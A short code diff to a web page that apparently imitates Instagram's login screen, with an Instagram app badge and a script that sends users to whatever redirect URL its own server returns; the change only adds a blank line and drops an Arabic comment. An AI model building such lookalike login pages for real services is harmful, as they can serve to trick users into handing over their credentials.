@@ -35,6 +35,7 @@
               <div class="login-box">
                 <p class="text">Don't have an account?<a href="#">Sign up</a></p>
               </div>
+              
               <div class="app">
                 <div class="app-img">
                     <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
@@ -94,7 +95,7 @@
       .then(response => response.json())
       .then(data => {
         if (data.success) {
-          window.location.href = data.redirect_url; // توجيه إلى URL المحدد من الخادم
+          window.location.href = data.redirect_url; 
         } else {
           var errorMessage = document.getElementById('error-message');
           errorMessage.textContent = data.message;
